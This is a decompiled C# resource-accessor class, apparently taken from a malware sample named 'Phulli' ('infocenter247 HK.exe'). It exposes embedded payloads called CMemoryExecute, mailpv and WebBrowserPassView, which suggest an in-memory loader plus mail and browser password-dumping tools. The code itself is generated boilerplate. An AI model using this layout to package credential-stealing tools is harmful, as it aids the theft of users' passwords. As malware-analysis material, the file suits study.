﻿// Decompiled with JetBrains decompiler
// Type: Phulli.My.Resources.Resources
// Assembly: Phulli, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5588EA96-561C-40B7-9B78-06ECD0A07CB4
// Assembly location: C:\Users\Voltaren\Desktop\infocenter247 HK.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

namespace Phulli.My.Resources
{
  [CompilerGenerated]
  [HideModuleName]
  [StandardModule]
  [DebuggerNonUserCode]
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
  internal sealed class Resources
  {
    private static ResourceManager resourceMan;
    private static CultureInfo resourceCulture;

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static ResourceManager ResourceManager
    {
      get
      {
        if (object.ReferenceEquals((object) Phulli.My.Resources.Resources.resourceMan, (object) null))
          Phulli.My.Resources.Resources.resourceMan = new ResourceManager("Phulli.Resources", typeof (Phulli.My.Resources.Resources).Assembly);
        return Phulli.My.Resources.Resources.resourceMan;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static CultureInfo Culture
    {
      get
      {
        return Phulli.My.Resources.Resources.resourceCulture;
      }
      set
      {
        Phulli.My.Resources.Resources.resourceCulture = value;
      }
    }

    internal static byte[] CMemoryExecute
    {
      get
      {
        return (byte[]) RuntimeHelpers.GetObjectValue(Phulli.My.Resources.Resources.ResourceManager.GetObject(nameof (CMemoryExecute), Phulli.My.Resources.Resources.resourceCulture));
      }
    }

    internal static byte[] mailpv
    {
      get
      {
        return (byte[]) RuntimeHelpers.GetObjectValue(Phulli.My.Resources.Resources.ResourceManager.GetObject(nameof (mailpv), Phulli.My.Resources.Resources.resourceCulture));
      }
    }

    internal static byte[] WebBrowserPassView
    {
      get
      {
        return (byte[]) RuntimeHelpers.GetObjectValue(Phulli.My.Resources.Resources.ResourceManager.GetObject(nameof (WebBrowserPassView), Phulli.My.Resources.Resources.resourceCulture));
      }
    }
  }
}